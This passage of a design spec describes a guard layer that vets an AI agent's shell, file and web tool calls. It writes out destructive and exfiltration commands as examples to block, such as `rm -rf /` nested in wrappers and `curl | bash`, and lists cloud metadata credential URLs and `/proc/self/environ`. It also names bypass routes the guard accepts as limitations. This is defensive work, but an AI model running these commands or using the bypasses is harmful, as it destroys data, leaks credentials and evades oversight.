### 4.2 Step 1: Inner Command Extraction

**Purpose:** Prevent guard bypass via shell wrappers (`bash -c "rm -rf /"`), command chaining (`safe && dangerous`), and obfuscation (`base64 -d | bash`).

**Algorithm:**

```
function extract_commands(raw: string) -> list<string>:
    // 1. Detect shell wrapper: bash/sh/zsh/dash/fish -c "..."
    //    Also matches combined flags (-lc, -ic) and separate flag tokens
    //    (-l -c, -x -l -c). See wrapper detection note below.
    if raw matches SHELL_WRAPPER_PATTERN:
        inner = extract_quoted_argument(raw)
        // Recursive for nested wrappers, with depth limit (max 5)
        return extract_commands(inner)  // recursive

    // 2. Split on command separators: &&, ||, ;, &, \n
    //    Respect quoting — do not split inside quotes, $(...), or `...`
    //    Note: & is single background operator (not &&), \n is newline
    //    Parse order: match && before & (longest match first)
    segments = split_on_separators(raw)

    // 3. Extract command substitutions: $(...) and backtick expressions
    //    embedded in arguments. Respects quoting context — substitutions
    //    inside single quotes are literal and not extracted.
    //    Collect into a separate list to avoid mutating during iteration.
    extra = []
    for segment in segments:
        extra.extend(extract_substitutions(segment))  // quote-aware

    return segments + extra
```

**Recursion depth limit:** Nested wrapper unwrapping (step 1) shares a depth counter with command substitution extraction (§5.2). The combined depth of wrapper unwrapping and substitution recursion must not exceed **5 levels**. If the limit is reached, the guard returns `Deny` with reason "Command nesting exceeds maximum depth for shell guard evaluation" and suggestion "Simplify the command to reduce nesting." This fail-closed behavior is consistent with the parse failure principle (§4.1) — commands that resist inspection are denied rather than partially evaluated. This prevents pathological inputs like `bash -c "bash -c \"bash -c ...\"" ` or deeply nested `$($($(…)))` from causing unbounded recursion or bypassing inspection.

**Shell wrapper binaries recognized (Unix):** `bash`, `sh`, `zsh`, `dash`, `fish`, `csh`, `tcsh`, `ksh` — detected via `<binary> <flags> -c "..."` pattern.

**Wrapper detection algorithm:** The implementation tokenizes the command and applies the following algorithm (normative):

```
function detect_wrapper(tokens: list<string>) -> Option<string>:
    if tokens[0] not in SHELL_WRAPPER_BINARIES: return None
    // Scan tokens[1..] for -c, either standalone or combined
    for i in 1..tokens.len():
        token = tokens[i]
        if token == "-c":
            // Standalone -c: inner command is the next token only.
            // Per POSIX, `sh -c command_string [command_name [argument...]]`:
            // tokens after the command string are positional parameters
            // ($0, $1, ...), not part of the command text.
            if i + 1 >= tokens.len():
                return Error  // -c with no following token: parse failure → Deny per §4.1
            return Some(tokens[i+1])
        if token starts with "-"
           and token.len() >= 2
           and token.len() <= 6  // dash + 1–5 letters
           and token[1..].chars().all(|c| c.is_ascii_alphabetic())
           and token[1..] contains 'c':
            // Combined flags with c (e.g., -lc, -ic, -lic):
            // inner command is the next token only (same POSIX semantics).
            if i + 1 >= tokens.len():
                return Error  // combined -c with no following token: parse failure → Deny per §4.1
            return Some(tokens[i+1])
        if token starts with "-":
            continue  // other flag token (e.g., -l, -x), keep scanning
        else:
            return None  // non-flag token before -c found; not a wrapper
    return None
```

**Missing inner command:** If `-c` (standalone or combined) is found but there is no following token (e.g., `bash -c` with nothing after it), this is a parse failure. Per §4.1, the guard returns Deny with reason "Unable to safely parse command for guard evaluation."

**POSIX `-c` semantics:** For `sh -c "cmd" arg0 arg1`, only the first argument after `-c` is the command string. Remaining arguments are assigned to `$0`, `$1`, etc. as positional parameters — they are not part of the command text and are not evaluated by the guard. This matches POSIX `sh(1)` and `bash(1)` behavior. Extracting only `tokens[i+1]` (rather than joining all remaining tokens) avoids false positives from positional parameters being concatenated into the command string.

This algorithm covers three forms:
1. **Standalone:** `bash -c "..."` — `-c` is an exact token match.
2. **Combined with other flags:** `bash -lc "..."`, `bash -ic "..."`, `bash -lic "..."` — a short flag token (dash + 1–5 ASCII letters) contains the letter `c`. The length cap (6 characters total) distinguishes combined single-character flags from unrelated long options that happen to contain `c` (e.g., a hypothetical `-vectorize` would not match).
3. **Separate flag tokens:** `bash -l -c "..."`, `bash -x -l -c "..."` — zero or more short flag tokens precede a standalone `-c`.

All three forms extract the same inner command string. The algorithm is a single codepath (not three separate regex paths), ensuring consistent behavior.

**Shell wrapper binaries recognized (Windows):** `cmd` (via `cmd /c "..."`), `powershell` and `pwsh` (via `powershell -Command "..."` / `pwsh -Command "..."`). Matching of both the binary name and the flag is **ASCII case-insensitive** for Windows wrappers: `CMD /C`, `cmd /c`, `Cmd /c`, `PowerShell -command`, `PWSH -COMMAND` are all recognized. Binary names with `.exe` suffixes (`cmd.exe`, `powershell.exe`, `pwsh.exe`) are also recognized — the implementation should strip a trailing `.exe` (case-insensitive) from the first token before comparing against the known binary list. This matches Windows convention where command names and flags are case-insensitive. ASCII-only comparison (via `eq_ignore_ascii_case`) is sufficient — Windows command names and flags are ASCII. These wrappers are recognized and their inner command string is extracted in step 1. After extraction, the inner string is processed through steps 2–4 using Unix-style rules only — Windows-native quoting, separators, and command syntax are not applied (see §11 for scope and limitations).

**`env` prefix stripping:** The `env` command (`env bash -c "rm -rf /"`, `env -i bash -c "..."`) is a common prefix before shell wrapper binaries. Before wrapper detection, the guard strips the `env` prefix and its arguments from the token list using the following algorithm:

1. If `tokens[0]` is not `env`, skip stripping entirely.
2. Strip the `env` token. Scan remaining tokens left-to-right, stripping each token that is an `env` argument:
   - Tokens containing `=` are `NAME=VALUE` assignments — strip the token.
   - `-i` / `--ignore-environment` — strip the token.
   - `-0` / `--null` — strip the token.
   - `-u` / `--unset` — strip the token **and** the following token (the variable name). If no following token exists, treat as parse failure and Deny per §4.1.
   - `-C` / `--chdir` — strip the token **and** the following token (the directory). If no following token exists, treat as parse failure and Deny per §4.1.
   - `-S` / `--split-string` — strip the token **and** the following token (the string). If no following token exists, treat as parse failure and Deny per §4.1.
   - `--` — strip the token and stop scanning (remaining tokens are the command).
   - Any other token starting with `-` that is not recognized — treat as parse failure and Deny per §4.1. Rationale: an unrecognized flag may consume a following argument token (like `-u` and `-C` do). Silently stripping only the flag token could leave its argument as the apparent command, bypassing wrapper detection. Failing closed is consistent with the parse failure principle and avoids this ambiguity.
   - Any token not starting with `-` and not containing `=` — stop scanning. This token and all remaining tokens are the command to pass to wrapper detection.
3. After stripping, the remaining tokens are processed through the normal wrapper detection algorithm.

This prevents `env bash -c "rm -rf /"`, `env -u VAR bash -c "rm -rf /"`, and `env -C /tmp bash -c "rm -rf /"` from bypassing wrapper detection. The stripping is shallow — only a single `env` prefix is removed (not `env env env ...` chains, which are handled by the recursion depth limit). `env` appearing later in the command (not as the first token) is not stripped — it is only recognized as a prefix.

**`sudo` / `doas` prefix handling:** Unlike `env`, `sudo` and `doas` are **not** stripped as prefixes. Their presence does not interfere with guard detection because destructive patterns use `\b` word boundaries (e.g., `\brm\b`) that match the command name regardless of preceding tokens — `sudo rm -rf /` matches the `rm` pattern just as `rm -rf /` does. Safe patterns are start-anchored (`^command\b...`), so `sudo ls` correctly does **not** match the `ls` safe pattern and falls through to step 3, where no destructive rule matches, yielding Allow at medium/high trust. At `low` trust, `sudo ls` is denied by default-deny (unmatched command), which is the correct behavior — `sudo` should not be used at low trust. Explicit `sudo`/`doas` stripping is intentionally omitted to avoid the complexity of parsing `sudo`'s flag syntax (`-u`, `-E`, `-H`, `--`, etc.), which is more complex than `env`'s. Test cases must confirm that `sudo rm -rf /` is denied and `sudo ls` behaves correctly at each trust level.

**Separator handling:** Split on `&&`, `||`, `;`, `\n` (newline), and `&` (background operator, single `&` not `&&`) — but only when not inside single quotes, double quotes, `$(...)` groups, or `` `...` `` (backtick) groups. The scanner must track nesting context using a **stack** (or depth counter for `$(...)`) rather than a flat state machine, because `$(...)` resets the quoting context for its interior — e.g., in `echo $(echo "a && b") && rm -rf /`, the `&&` inside the double quotes inside `$(...)` must not be split, while the outer `&&` must be split. Pipes (`|`) are not split (they form a single pipeline) — destructive patterns are matched against the entire pipeline string. This means `cat file | xargs rm -rf` is caught by `core.filesystem` patterns matching `rm` with recursive/force flags anywhere in the string.

**Parse order for `&` vs `&&`:** The separator scanner must match multi-character operators (`&&`, `||`) before single-character operators (`&`, `;`, `\n`). This is a longest-match-first rule: when scanning `cmd1 && cmd2 & cmd3`, the scanner must recognize `&&` as a single separator (not two `&` operators). Implementation: scan for `&&` and `||` first, then for single `&`, `;`, and `\n`.

**Newline and background splitting rationale:** Newlines and `&` are command boundaries in POSIX shells, just like `&&`, `||`, and `;`. Without splitting on them, an input like `git status\nrm -rf /` would be evaluated as a single segment, potentially matching a safe pattern for `git status` and short-circuiting before the destructive `rm -rf /` is checked. Similarly, `safe-command & rm -rf /` runs both commands. Both must be split so each segment is evaluated independently.

**Pipe false positive mitigation:** Because pipes are not split, a destructive pattern appearing as *data* in a pipeline (e.g., `grep "rm -rf" logfile | wc -l`) could trigger a false positive. Destructive patterns should use `\b` word boundaries and anchoring to reduce this risk, but complete elimination is not possible without full AST parsing (deferred as a future enhancement). This is an acceptable trade-off — false positives are safe (blocked commands can be rephrased), while false negatives are dangerous.

**Pipe-to-shell detection:** Pipe-to-shell patterns (e.g., `curl ... | bash`, `base64 -d | sh`) are detected exclusively in step 3 via `core.obfuscation` pack patterns — they are **not** handled during command extraction (step 1). Step 1 only performs wrapper unwrapping, separator splitting, and substitution extraction.

**Windows (limited):** Windows wrapper prefixes (`cmd /c`, `powershell -Command`, `pwsh -Command`) are recognized and stripped in step 1 (see wrapper list above). After prefix stripping, the inner string is processed through steps 2–4 using **Unix-style rules only** — Windows-specific quoting (e.g., `^` as escape), separators (e.g., `&` in `cmd.exe` is an unconditional command separator, unlike POSIX where `&` is a background operator), and command syntax are not applied. This catches common patterns since agent-generated commands typically use Unix-style syntax even on Windows (via Git Bash, WSL, or cross-platform tools). Native `cmd.exe` commands (e.g., `del /s /q`, `rmdir /s /q`) are **not** covered by the Unix-oriented pattern packs. Full Windows-native parsing, quoting rules, and destructive pattern packs are deferred as future enhancements.

### 4.3 Step 2: Safe Pattern Check

**Purpose:** Short-circuit known-safe commands before running destructive pattern matching.

Safe pattern matching uses the same two-phase approach as destructive patterns (§4.4):

**Phase A — Regex candidate scan.** All safe patterns are compiled into a single `LazyLock<RegexSet>`. `RegexSet::matches()` returns the indices of candidate patterns; a parallel `Vec<&PatternRule>` (built in the same order as the `RegexSet`) maps each index back to its `PatternRule`.

**Phase B — Post-match validation.** When a safe `PatternRule` carries a `validator`, the validator runs on each regex candidate. Candidates that **fail** validation (validator returns `false`) are discarded — the command is **not** considered safe and falls through to step 3. This enables conditional safe patterns like `find`: a regex (`^find\b[^|><]*$`) selects candidates, and the validator rejects commands containing dangerous flags (`-exec`, `-delete`, etc.). Most safe patterns have `validator: None` and match on the regex alone.

If any pattern survives both phases, the verdict is **Allow** and evaluation stops.

Safe patterns must be strictly anchored with `^` to prevent accidental matching of destructive commands that happen to contain safe substrings.

**Safe pattern termination requirement:** Because step 2 short-circuits before step 3 (destructive checks), safe patterns must guard against shell operators that could chain or redirect into dangerous operations. Every safe pattern must:

1. Use a start-of-string anchor (`^`).
2. Use an end-of-string anchor (`$`).
3. **Exclude pipe and redirection operators from the variable portion of the regex** by using the character class `[^|><]` instead of `.` (dot).

Negative lookaheads are **not** used (Rust's `regex` crate does not support them — see §1.3 principle 7). The `$` anchor alone is **not sufficient** — a pattern like `^echo\b.*$` would still match `echo foo > /etc/passwd` because `.*` greedily consumes `>` and all subsequent characters. The `[^|><]` character class exclusion is required to prevent this.

Step 1 already splits on `&&`, `||`, `;`, `&`, and `\n` — so by the time a segment reaches step 2, it contains no command separators. The remaining dangerous operators that survive step 1 are:

- Pipes: `|` (not split in step 1 — pipelines are a single segment)
- Redirections: `>`, `<`, `>>`

The standard safe pattern form is `^command\b[^|><]*$`. If a command contains a pipe or redirection (e.g., `echo foo > /etc/passwd`, `cat file | bash`), the `[^|><]` class rejects the operator character and the regex does **not** match, falling through to step 3 for destructive pattern checking.

**Trade-off:** Commands with quoted pipe/redirect characters in arguments (e.g., `echo "hello > world"`) will also fail the safe pattern match and fall through to step 3. Since step 3 won't match them as destructive either, they will be allowed at medium/high trust via the default-allow rule. The false non-match at step 2 is harmless — it causes a minor performance cost (running step 3 unnecessarily) but no incorrect verdicts.

**Rationale:** Without the `[^|><]` exclusion, `^echo\b.*$` matches `echo x > /etc/passwd`, allowing the safe short-circuit to bypass destructive checks. The dot-free character class is the simplest mechanism that is compatible with `RegexSet` (no lookaround needed).

### 4.4 Step 3: Destructive Pattern Check

**Purpose:** Identify and block known-destructive commands.

Destructive pattern matching uses a two-phase approach:

**Phase A — Regex candidate scan.** All destructive patterns across all packs are compiled into a single `LazyLock<RegexSet>`. `RegexSet::matches()` returns the indices of candidate patterns; a parallel `Vec<&PatternRule>` (built in the same order as the `RegexSet`) maps each index back to its `PatternRule`.

**Phase B — Post-match validation.** Some rules require programmatic validation after the regex matches. `PatternRule` carries an optional `validator: Option<fn(&str) -> bool>` — a **pure function** (no I/O, no mutable state, no environment access) that receives the command segment string and returns `true` if the rule should fire. When present, the validator runs on each regex candidate; candidates that fail validation are discarded. This enables hybrid rules (§6.2 rule 7) where a broad regex selects candidates (e.g., `\brm\b`) and the validator tokenizes arguments to check flag combinations accurately. Validators also replace regex negative lookahead (which Rust's `regex` crate does not support) for exclusion logic — e.g., the `force_push` validator checks for `--force` while excluding `--force-with-lease`.

**Validator input:** The evaluator pre-splits pipeline segments before invoking validators. Since pipes are not split during step 1 command extraction (§4.2 — pipelines remain as single segments so that `core.obfuscation` patterns can match `curl | bash`), the evaluator performs pipe-splitting as a **convenience layer between Phase A and Phase B**. After the `RegexSet` identifies candidate rules in Phase A, the evaluator calls `pipe_split()` on the matched segment, producing individual pipe segments. For each candidate rule, the evaluator passes **each pipe segment** to the validator individually (not the full pipeline string). If the validator returns `true` for **any** pipe segment, the rule fires. This means validators receive simple, single-command strings and do not need to handle pipeline decomposition internally — they only need to tokenize arguments and check flags. For example, when `grep -r pattern | xargs rm -rf dir` matches the `rm` regex, the evaluator splits it into `["grep -r pattern", "xargs rm -rf dir"]` and calls the `rm` validator on each segment. The validator sees `grep -r pattern` (returns `false` — no `rm` flags) and `xargs rm -rf dir` (returns `true` — destructive flags found). The rule fires. The `pipe_split()` utility is exposed by `tokenizer.rs` (§5.3) and handles quoting context. **Note:** The regex in Phase A still matches against the full pipeline string (pre-split) — this is correct because destructive commands inside any pipe segment will match the regex against the full string. Only validators receive individual segments.

When multiple candidates survive both phases, the highest-confidence match wins. If tied on confidence, the **first rule in global registration order** wins — packs are registered in the order they appear in `packs/mod.rs` (core packs first, then extended packs in file order), and rules within each pack are ordered as defined in the source. The `RegexSet` and parallel `Vec<&PatternRule>` are built in this same order, so the index directly determines priority. Pack authors must order rules from most-specific to least-specific within each confidence level to ensure the best suggestion is surfaced. For example, in `core.filesystem`, `recursive_delete_root` (High, system dir target) is defined before `recursive_delete_force` (High, any target) — so `rm -rf /` matches both, but `recursive_delete_root` wins by position, providing the more actionable suggestion ("Specify the exact subdirectory" vs. "Delete specific files by name").

**Verdict determination:**

| Confidence | `trustLevel: low` | `trustLevel: medium` | `trustLevel: high` |
|------------|-------|--------|------|
| High | Deny | Deny | Deny |
| Medium | Deny | Deny | Warn |

**`Warn` never returned at `low` trust:** As the table shows, both confidence levels produce `Deny` at `low` trust. The implementation must enforce this invariant — shell evaluation must never return a warn verdict when `trust_level == TrustLevel::Low`. Any code path that would produce `Warn` at `low` trust is a bug.

### 4.5 Multi-Command Verdict Resolution

When step 1 extracts multiple sub-commands, each is evaluated through steps 2–3 independently. The verdict set includes **both** segments (from separator splitting) **and** extracted substitutions (from `$(...)` / `` `...` `` extraction). Every entry in the verdict set is evaluated through the full pipeline (steps 2–3), regardless of the verdict on any other entry. In particular:

- A safe-pattern match on the outer segment does **not** short-circuit evaluation of extracted substitutions. Even if `echo "$(rm -rf /)"` matches the `echo` safe pattern, the extracted `rm -rf /` is still evaluated independently.
- Command substitutions extracted from arguments always receive full pipeline evaluation.

The strictest verdict wins:

```
Deny > Warn > Allow
```

If any entry is denied, the entire command is denied. The denial reason cites the specific sub-command or substitution that triggered it.

**Pseudocode:**

```
function evaluate_command(raw: string, guard: ShellToolGuard) -> GuardVerdict:
    // Step 1: extract all commands (segments + substitutions)
    commands = extract_commands(raw)  // returns segments + extra (§4.2)

    verdicts = []
    for cmd in commands:
        verdict = evaluate_single(cmd, guard)  // steps 2–3
        verdicts.append(verdict)

    return strictest(verdicts)  // Deny > Warn > Allow
```

### 4.6 Post-Match Validator API

Post-match validators are referenced throughout §4.3 (safe patterns) and §4.4 (destructive patterns). This section formalizes their API.

**Signature:**

```rust
type Validator = fn(&str) -> bool;
```

A validator is a **pure function** (no I/O, no mutable state, no environment access) that receives the command segment string and returns:
- `true` — the rule fires (the regex match is confirmed).
- `false` — the rule does not fire (the regex match is discarded).

**Semantics by context:**
- **Safe pattern validator** (§4.3 Phase B): returning `false` means the command is **not** considered safe — it falls through from step 2 to step 3 for destructive checking. Example: the `find` safe validator returns `false` when `-exec` is present, preventing `find . -exec rm {} \;` from short-circuiting as safe.
- **Destructive pattern validator** (§4.4 Phase B): returning `false` means the rule does **not** fire — the candidate is discarded. Example: the `force_push` validator returns `false` when `--force-with-lease` is present, preventing `git push --force-with-lease` from being blocked.

**Constraints:**
1. Validators must be deterministic — same input, same output.
2. Validators must not panic. If internal tokenization fails (e.g., malformed quoting within the segment), the validator must return the **conservative default for its context**:
   - **Destructive pattern validators** should return `true` (conservative — let the rule fire rather than silently discard it; blocking a legitimate command is safer than allowing a destructive one).
   - **Safe pattern validators** should return `false` (conservative — do not short-circuit to Allow on unparseable input; let the command fall through to step 3 for destructive checking).
   In both cases, the conservative choice is the one that does not reduce the guard's protective effect.
3. Validators receive individual pipe segments (pre-split by the evaluator — see §4.4 "Validator input"). For pipeline commands, the evaluator calls `pipe_split()` and invokes the validator on each segment; the rule fires if any segment returns `true`.
4. Validators are optional (`Option<fn(&str) -> bool>`). When `None`, the regex match alone determines the outcome.

---

### 4.7 File Tool Guard

The `FileToolGuard` evaluates path-based risks for:
- `read_file`
- `read_many_files`
- `grep` (guards its `path`; when omitted, effective path is `env.working_directory()`)
- `write_file`
- `edit_file`
- `apply_patch`

**`grep` coverage limitation:** The guard checks only the stated `path` argument (or the working directory fallback). It does not inspect `--include`/`--exclude` glob patterns or account for recursive directory traversal (`-r`). A `grep -r` invocation with `path: "/"` would be caught by `file.system_path_read`, but `grep -r` within the workspace can traverse the entire workspace tree including files the agent might not otherwise access. Full recursive-descendant enumeration guarding is deferred (§12).

Pipeline:

```
path(s) from tool args
        │
        ▼
normalize path (~, .., relative -> absolute against working dir)
        │
        ▼
evaluate rules in table order (strictest verdict wins)
        │
        ▼
GuardVerdict (Allow if no rule matches)
```

**Rule resolution order:** All applicable rules for the tool category (read or write) are evaluated against the normalized path. The rule producing the **strictest verdict** wins (`Deny > Warn > Allow`). If multiple rules produce the same strictest verdict (e.g., two Deny matches), the rule appearing **first in the normative table order** (§6.6.1 for reads, §6.6.2 for writes) determines the `rule_id`, `reason`, and `suggestion` in the returned `GuardVerdict` and audit record. For example, `/proc/self/environ` matches both `file.system_path_read` (Deny, row 1) and `file.sensitive_path_read` (Deny at low/medium, row 2) — `system_path_read` wins by table position. This is analogous to the shell guard's registration-order tie-break (§4.4).

**Default verdict (no rule match):** If no file guard rule matches the normalized path, the verdict is **Allow** at all trust levels. Unlike the shell guard (which is default-deny at `low` trust), the file guard has no "unmatched" deny behavior — the enumerated rules in §6.6 are the complete set of checks. This is intentional: file tool paths are structured arguments (not free-form shell strings), so the risk of an unrecognized path being destructive is low compared to an unrecognized shell command.

**Workspace root vs working directory:** Relative paths resolve against the execution environment working directory. `outside_workspace_*` checks are against the original session workspace root passed at `ToolGuard` construction. Subagents may use scoped working directories; these checks remain anchored to session root.

**`/proc` credential leak note:** The `file.system_path_read` rule blocks all paths under `/proc/`, which includes `/proc/self/environ` — a well-known credential leak vector that exposes the process's environment variables (often containing API keys, tokens, and secrets). This is caught by prefix match on the `SYSTEM_READ_PATHS` entry `/proc/`. Test cases should explicitly cover `/proc/self/environ` as a high-value target.

**Symlink limitation:** Current normalization does not call `fs::canonicalize()`. Symlink targets are not resolved during guard checks.

**`apply_patch` multi-path behavior:** Parse all path targets (`AddFile`, `DeleteFile`, `UpdateFile.path`, `UpdateFile.move_to`), evaluate each as write targets, then apply strictest-wins. Also count deletes for `file.apply_patch_delete_many`.

### 4.8 Web Tool Guard

The `WebToolGuard` evaluates URL and host risks for `web_fetch`.

Pipeline:

```
url from tool args
      │
      ▼
parse with url::Url (scheme, host, port, path)
      │
      ▼
built-in rules -> domain allow/deny lists
      │
      ▼
GuardVerdict (Allow if no rule fires and domain lists pass or are absent)
```

**Default verdict (no rule fires):** If no built-in web rule matches and the URL passes domain list checks (or no domain lists are configured), the verdict is **Allow** at all trust levels. The web guard is not default-deny at any trust level — only explicitly enumerated rules and domain list mismatches produce non-Allow verdicts.

**Rule evaluation order (normative):**
1. `web.credential_url`
2. `web.metadata_endpoint`
3. `web.internal_network`
4. `web.non_https`
5. `web.high_risk_port`
6. `web.domain_allowlist` / `web.domain_denylist`

Built-in rules cannot be overridden by domain lists. Evaluation is short-circuiting: the first rule that fires determines the verdict and `rule_id`.

**Most-specific-first ordering rationale:** Metadata hosts (`169.254.169.254`, `metadata.google.internal`, `100.100.100.200`) are a subset of hosts that also match `web.internal_network` — `169.254.169.254` is a link-local address (private IP range), `metadata.google.internal` matches `*.internal`, and `100.100.100.200` is in the `100.64.0.0/10` shared address range. If `internal_network` fired first, metadata requests would always be logged as `rule_id = "web.internal_network"`, losing the audit signal that distinguishes "agent tried to access cloud credentials" from "agent tried to reach a local service." The most-specific-first order ensures `credential_url` and `metadata_endpoint` fire with their precise `rule_id` before the broader `internal_network` catch-all.

**`web.credential_url` vs `web.metadata_endpoint` distinction:** `web.credential_url` is the most specific check — it fires only when the URL host is a known metadata endpoint **and** the URL path matches a credential/token path prefix. `web.metadata_endpoint` is the next level — it fires when the host is a known metadata endpoint, regardless of path. Both produce the same verdict (Deny at all trust levels), but the distinction exists for audit clarity: `credential_url` indicates a likely credential exfiltration attempt, while `metadata_endpoint` catches general metadata access (instance ID, network config, etc.). If a future version introduces different verdicts for the two rules (e.g., Warn for general metadata at high trust), the separation will allow it without restructuring.

**`web.credential_url` path patterns (normative):**

```rust
pub const METADATA_HOSTS: &[&str] = &[
    "169.254.169.254",           // AWS, Azure, most cloud providers
    "metadata.google.internal",  // GCP
    "100.100.100.200",           // Alibaba Cloud
];

pub const CREDENTIAL_PATH_PREFIXES: &[&str] = &[
    // AWS IMDSv1/v2
    "/latest/meta-data/iam/security-credentials",
    "/latest/api/token",
    // GCP
    "/computeMetadata/v1/instance/service-accounts",
    // Azure
    "/metadata/identity/oauth2/token",
    // Alibaba Cloud
    "/latest/meta-data/ram/security-credentials",
];
```

`web.metadata_endpoint` fires when the host matches any `METADATA_HOSTS` entry. `web.credential_url` fires when the host matches any `METADATA_HOSTS` entry **and** the URL path starts with any `CREDENTIAL_PATH_PREFIXES` entry (case-sensitive prefix match after normalization of consecutive slashes). Both are high-confidence Deny at all trust levels.

**Domain list precedence:** If `allowedDomains` is set, deny any non-matching host and ignore `disallowedDomains`. Otherwise, if `disallowedDomains` is set, deny matching hosts.

**Host normalization for domain matching:** Before comparing against `allowedDomains` or `disallowedDomains`, the host from the parsed URL and all entries in the domain lists are normalized:
1. **ASCII case-fold:** Convert to lowercase using ASCII case-folding (sufficient because domain names are ASCII per IDNA/punycode).
2. **Strip trailing dot:** Remove a single trailing `.` if present (e.g., `docs.rs.` → `docs.rs`). A trailing dot is a valid DNS root marker but must not cause matching failures.
3. **No IDNA/punycode decoding:** Internationalized domain names are compared in their punycode form as returned by `url::Url`. The domain list must use punycode for non-ASCII domains.

`url::Url::host_str()` already lowercases ASCII hosts per the URL Standard, so step 1 primarily normalizes the domain list entries. Implementations must apply the same normalization to both sides of the comparison.

**`web_fetch` tool semantics:** Guard checks URL regardless of `raw`. `raw` affects response formatting only.

**Known limitations:** No DNS rebinding defense and no numeric IP obfuscation normalization in the current scope; these are deferred as future enhancements.

---

## 5. Shell Tokenization

### 5.1 Tokenization Rules

The tokenizer follows POSIX shell quoting rules (a subset sufficient for agent-generated commands):

1. **Unquoted tokens** are split on whitespace.
2. **Single-quoted strings** (`'...'`) are literal — no escaping inside.
3. **Double-quoted strings** (`"..."`) allow `\"` and `\\` escape sequences.
4. **Backslash escaping** outside quotes: `\ ` (escaped space) keeps tokens together.

The tokenizer does **not** handle:
- Heredocs (`<<EOF`)
- Process substitution (`<(...)`)
- Brace expansion (`{a,b,c}`)
- Glob expansion (`*.txt`)
- Variable expansion (`$VAR`, `${VAR}`)

These are intentional omissions — the tokenizer operates on the raw command string before shell interpretation. Variable expansion in particular is a known bypass vector (see §1.2 Threat Model).

### 5.2 Command Substitution Extraction

The tokenizer extracts `$(...)` and `` `...` `` expressions from the command string, **respecting shell quoting context**. (Backtick substitution is POSIX-supported but deprecated in favor of `$(...)`. LLMs overwhelmingly generate the `$(...)` form, so backtick extraction is included for completeness but is rarely exercised in practice.) Substitutions inside single quotes are literal and must not be extracted (e.g., `echo '$(rm -rf /)'` is safe — the shell does not evaluate `$(...)` inside single quotes). Substitutions inside double quotes are extracted (the shell evaluates them). Substitutions in unquoted context are extracted. The extractor must track quoting state (unquoted, single-quoted, double-quoted) as it scans the string.

Nested `$(...)` is handled by parenthesis depth counting — the outermost substitution is extracted first, then its contents are recursively processed through the full extraction pipeline (step 1), so `$($(rm -rf /))` correctly evaluates `rm -rf /`. Extracted substitutions are evaluated as independent commands through the full pipeline (steps 2–3).

**Substitution recursion depth limit:** Command substitution extraction shares a depth counter with wrapper unwrapping (§4.2). The combined depth of wrapper unwrapping and substitution recursion must not exceed **5 levels**. If the limit is reached, the guard returns `Deny` with reason "Command nesting exceeds maximum depth for shell guard evaluation" and suggestion "Simplify the command to reduce nesting." This fail-closed behavior is consistent with the parse failure principle (§4.1) and the wrapper depth limit (§4.2). This prevents pathological inputs like `$($($($($($($(cmd)))))))` from causing unbounded recursion or bypassing inspection, even within the 8KB input length limit.

**Arithmetic expansion:** `$((…))` (double parentheses) is POSIX arithmetic expansion, not command substitution. The parenthesis depth counter must distinguish `$((` (arithmetic, depth +2, not extracted) from `$(` (command substitution, depth +1, extracted). The check must be positional: `$((` is arithmetic only when the two opening parentheses are **immediately adjacent** after `$` — i.e., the scanner sees the three-character sequence `$((` at the current position. The sequence `$( (` (with whitespace between `$(` and `(`) is a command substitution containing a subshell, not arithmetic, and should be extracted normally. When the scanner sees `$((`, it should skip the arithmetic expression (tracking parenthesis depth to find the matching `))`) without extracting it as a command. If the implementation cannot reliably distinguish them (e.g., `$((rm -rf /))` is technically valid arithmetic that evaluates to 0), the conservative choice is to extract and evaluate — false positives are safe.

### 5.3 Pipe Splitting Utility

The `tokenizer.rs` module exposes a shared utility for splitting a command string on pipe operators (`|`), respecting quoting context (single quotes, double quotes, `$(...)`, `` `...` ``):

```rust
pub fn pipe_split(input: &str) -> Vec<&str>
```

This utility is **not** used during step 1 command extraction — pipes are intentionally preserved as single pipeline segments so that `core.obfuscation` patterns can match patterns like `curl ... | bash` against the full string. Instead, `pipe_split()` is used by the **evaluator** as a convenience layer between Phase A (regex candidate scan) and Phase B (post-match validation). After `RegexSet` identifies candidates against the full pipeline string, the evaluator calls `pipe_split()` and passes individual pipe segments to validators (see §4.4 "Validator input"). For example, when `grep -r pattern | xargs rm -rf dir` matches the `rm` regex, the evaluator splits it into `["grep -r pattern", "xargs rm -rf dir"]` and calls the validator on each segment individually.

Validators receive single pipe segments and do not need to handle pipeline decomposition — the evaluator handles this uniformly for all validators.

---

## 6. Guard Rules

### 6.1 Shell Pack Structure

```rust
pub struct Pack {
    pub id: &'static str,
    pub name: &'static str,
    pub description: &'static str,
    pub safe_patterns: &'static [PatternRule],
    pub destructive_patterns: &'static [PatternRule],
}

pub struct PatternRule {
    pub id: &'static str,
    pub pattern: &'static str,        // regex (phase A candidate scan)
    pub validator: Option<fn(&str) -> bool>,  // phase B post-match check (§4.3, §4.4)
    pub reason: &'static str,
    pub suggestion: &'static str,     // required — guides the LLM
    pub confidence: Confidence,
}

pub enum Confidence {
    /// Always denied, even at trustLevel: high.
    High,
    /// Denied at medium, downgraded to Warn at high.
    Medium,
}
```

### 6.2 Shell Pattern Authoring Rules

1. **Anchoring:** All safe patterns must start with `^` (start-of-string anchor) **and** end with `$` (end-of-string anchor), **and must use `[^|><]` instead of `.` (dot) in their variable portions** to exclude pipe and redirection operators. Negative lookaheads are not used (Rust's `regex` crate does not support them — see §1.3 principle 7). The `[^|><]` exclusion prevents `echo foo > /etc/passwd` from short-circuiting as safe (the `$` anchor alone is insufficient — see §4.3), and the `^` anchor prevents `"git status"` from matching inside other commands. The standard safe pattern form is `^command\b[^|><]*$`. See §4.3 for the full safe pattern termination requirement.
2. **Negative tests required:** Each pattern (safe and destructive) must include negative test cases. Safe patterns must include negative tests against **unsplit shell operators** — pipes (`cmd | bash`) and redirections (`cmd > file`) — which are the operators that survive step 1 extraction and could bypass step 3 if the safe pattern matches. Tests against separators that *are* split in step 1 (`&&`, `;`, `&`, `\n`) are **pipeline-level** tests (verifying step 1 splitting + step 2/3 per-segment evaluation), not safe-pattern regex tests. Destructive patterns must include negative tests against known safe supersets (e.g., `git reset --hard` must not match `grep "git reset --hard"`).
3. **Suggestion required:** Every destructive pattern must have a non-empty `suggestion` field. The suggestion should name the specific safe alternative command.
4. **Confidence assignment:** If a pattern is not confident enough to be `Medium`, it should not be in the pack at all. `High` is reserved for commands with no legitimate agent use case in their destructive form.
